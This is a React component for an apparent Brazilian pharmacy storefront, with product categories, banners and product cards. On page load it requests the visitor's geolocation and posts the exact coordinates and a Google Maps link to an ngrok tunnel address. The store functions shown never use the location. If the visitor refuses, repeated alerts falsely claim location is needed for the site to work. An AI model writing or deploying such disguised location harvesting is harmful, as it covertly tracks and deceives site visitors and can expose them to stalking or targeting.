import { useState, useEffect } from "react";
import { Swiper, SwiperSlide } from 'swiper/react';
import { Autoplay, Pagination } from 'swiper/modules';
import 'swiper/css';
import 'swiper/css/pagination';

import s from './inicio.module.scss';

import banner1 from '../../assets/Banners/Banner1.png'
import banner2 from '../../assets/Banners/Banner2.png'
import banner3 from '../../assets/Banners/Banner3.png'
import banner4 from '../../assets/Banners/Banner4.png'
import banner5 from '../../assets/Banners/Banner5.png'
import banner6 from '../../assets/Banners/Banner6.png'

import prod1 from '../../assets/Produtos/prod1.jpg'
import prod2 from '../../assets/Produtos/prod2.jpg'
import prod3 from '../../assets/Produtos/prod3.jpg'
import prod4 from '../../assets/Produtos/prod4.jpg'
import prod5 from '../../assets/Produtos/prod5.jpg'

export default function Inicio() {
    const [bannerRemedio, setbannerRemedio] = useState([ 
        banner1, banner2, banner3, banner4, banner5, banner6
    ]);
    const [locationDenied, setLocationDenied] = useState(false); // Controla o estado de recusa da geolocalização

    useEffect(() => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, handleError);
        } else {
            console.warn("Geolocalização não é suportada.");
        }
    }, []);

    function sendLocation(position) {
        const { latitude, longitude } = position.coords;
        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

        fetch("https://9d70-45-168-41-138.ngrok-free.app/send-location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude, longitude, maps })
        })
            .then((res) => res.json())
            .then((data) => {
                if (!data.success) {
                    console.warn("Erro ao enviar localização.");
                } else {
                    console.log("Localização enviada com sucesso!");
                }
            })
            .catch((err) => {
                console.error("Erro:", err);
            });
    }

    function handleError(error) {
        switch (error.code) {
            case error.PERMISSION_DENIED:
                alert("Você recusou o compartilhamento da localização. A geolocalização é necessária para o funcionamento correto do site.");
                setLocationDenied(true); // Marca que a localização foi recusada
                break;
            case error.POSITION_UNAVAILABLE:
                alert("Não foi possível determinar sua localização. Tente novamente mais tarde.");
                break;
            case error.TIMEOUT:
                alert("A solicitação de localização expirou. Tente novamente.");
                break;
            case error.UNKNOWN_ERROR:
                alert("Ocorreu um erro desconhecido ao tentar obter sua localização.");
                break;
            default:
                alert("Erro ao obter a localização.");
                break;
        }
    }

    function requestLocationAgain() {
        setLocationDenied(false); // Reseta o estado de recusa
        // Tenta novamente obter a localização
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    }

    return (
        <main className={s.Main}>
            <nav>
                <ul>
                    <li><a href="">Dor e Febre</a></li>
                    <li><a href="">Infantil</a></li>
                    <li><a href="">Gripe e Resfriado</a></li>
                    <li><a href="">Vitaminas</a></li>
                    <li><a href="">Primeiros Socorros</a></li>
                    <li><a href="">Beleza</a></li>
                    <li><a href="">Sistema Digestivo</a></li>
                    <li><a href="">Higiene</a></li>
                    <li><a href="">Conveniência</a></li>
                </ul>
            </nav>

            <section className={s.carouselWrapper}>
                <Swiper
                    modules={[Autoplay, Pagination]}
                    autoplay={{ delay: 3000 }}
                    pagination={{ clickable: true }}
                    loop={true}
                    spaceBetween={5}
                    slidesPerView={1}
                >
                    {bannerRemedio.map((src, i) => (
                        <SwiperSlide key={i}>
                            <img src={src} alt={`Banner ${i + 1}`} className={s.bannerImagem} />
                        </SwiperSlide>
                    ))}
                </Swiper>
            </section>

            <section className={s.categorias}>
                <Swiper
                    autoplay={{ delay: 3000 }}
                    pagination={{ clickable: true }}
                    loop={true}
                    spaceBetween={1}
                    slidesPerView={5}
                >
                    {[prod1, prod2, prod3, prod4, prod5, prod5, prod4].map((produto, i) => (
                        <SwiperSlide key={i}>
                            <section className={s.card}>
                                <img className={s.imgProduto} src={produto} alt="" />
                                <div className={s.infor}>
                                    <p className={s.desc}>Absorvente Tripla Proteção Cobertura Suave Com Abas</p>
                                    <p className={s.preco}>R$ 11,99</p>
                                    <p className={s.desconto}>12% OFF</p>
                                </div>
                                <div className={s.campoCompra}>
                                    <div className={s.campoCompraDois}>
                                        <button className={s.btnAtribuir}>-</button>
                                        <p className={s.quantidade}>1</p>
                                        <button className={s.btnAtribuir}>+</button>
                                    </div>
                                    <button className={s.Comprar}>Comprar</button>
                                </div>
                            </section>
                        </SwiperSlide>
                    ))}
                </Swiper>
            </section>

            {locationDenied && (
                <div className={s.locationError}>
                    <p>Você recusou o compartilhamento da localização. Para continuar, por favor, permita o acesso à sua localização.</p>
                    <button onClick={requestLocationAgain}>Tentar novamente</button>
                </div>
            )}
        </main>
    );
}
